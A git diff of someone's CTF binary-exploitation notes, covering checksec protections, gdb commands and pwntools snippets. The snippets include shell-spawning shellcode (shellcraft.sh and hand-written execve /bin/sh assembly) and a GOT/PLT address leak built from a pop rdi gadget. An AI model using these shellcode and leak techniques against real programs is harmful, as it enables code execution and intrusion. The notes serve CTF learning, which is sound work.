@@ -1,7 +1,6 @@
 # writeup and some notes 
 ### (last update 21 December 2023)
-
-## PWN Notes
+# PWN Notes
 
 1. Run `checksec` check the properties of executable of binary security.
 	- **Stack Canaries** = a secret value placed on the stack which changes every time the program is started. the stack canary is checked and if it appears to be modified, the program exits immeadiately.
@@ -113,7 +112,48 @@ for i in range(1,100):
   canary # check stack canary address
   x/100x $rsp # check 100 bytes in rsp 
 ```
-7. pwntools functions
+7. pwntools functions i normally
+To get output 
+```python
+leak_puts = u64(output.ljust(8,b"\x00")) # do this if theres no \n
+leak = u64(p.recvline().strip().ljust(8,b'\0')) # do this if theres \n at the end
+```
+get address
+```python
+main = p64(elf.symbols.main)
+plt_puts = p64(elf.plt.puts)
+got_puts = p64(elf.got.puts)
+```
+shellcode
+```python
+shellcode = asm(shellcraft.cat('flag.txt'))
+shellcode = asm(shellcraft.sh())
+shellcode = asm('\n'.join([
+    'push %d' % u32('/sh\0'),
+    'push %d' % u32('/bin'),
+    'xor edx, edx',
+    'xor ecx, ecx',
+    'mov ebx, esp',
+    'mov eax, 0xb',
+    'int 0x80',
+]))
+```
+Example
+```python
+output = io.recv().split(b'\n')
+print("output : ", output)
+leak_puts = u64(output[0].ljust(8,b"\x00")) # do this if theres no \n
+leak_printf = u64(output[1].ljust(8,b"\x00"))
+leak = u64(p.recvline().strip().ljust(8,b'\0')) # do this if theres \n at the end
+```
+Leaking libc functions address
+```python
+# for leaking address, pop_rdi(pop rdi, ret; gadget)
+payload += pop_rdi + got_puts + plt_puts 
+leak = u64(p.recvline().strip().ljust(8,b'\0'))
+print("puts {}".format(str(hex(leak))))
+```
+others
 ```python
 # example payload converter func
 payload = flat(
@@ -131,20 +171,19 @@ asm('\n'.join([
     'mov eax, 0xb',
     'int 0x80',
 ]))
-shellcode = asm(shellcraft.cat('flag.txt'))
-shellcode = asm(shellcraft.sh())
 # getting address
-## sample getting address
+## sample getting address from output
 output = io.recv().split(b'\n')
 print("output : ", output)
 leak_puts = u64(output[0].ljust(8,b"\x00")) # do this if theres no \n
 leak_printf = u64(output[1].ljust(8,b"\x00"))
 leak = u64(p.recvline().strip().ljust(8,b'\0')) # do this if theres \n at the end
+
 main = p64(elf.symbols.main)
 plt_puts = p64(elf.plt.puts)
 got_puts = p64(elf.got.puts)
 # for leaking address, pop_rdi(pop rdi, ret; gadget)
-secondPayload += pop_rdi + got_puts + plt_puts 
+payload += pop_rdi + got_puts + plt_puts 
 # output format i used for leaking address
 leak_puts = u64(output[0].ljust(8,b"\x00"))
 leak_printf = u64(output[1].ljust(8,b"\x00"))
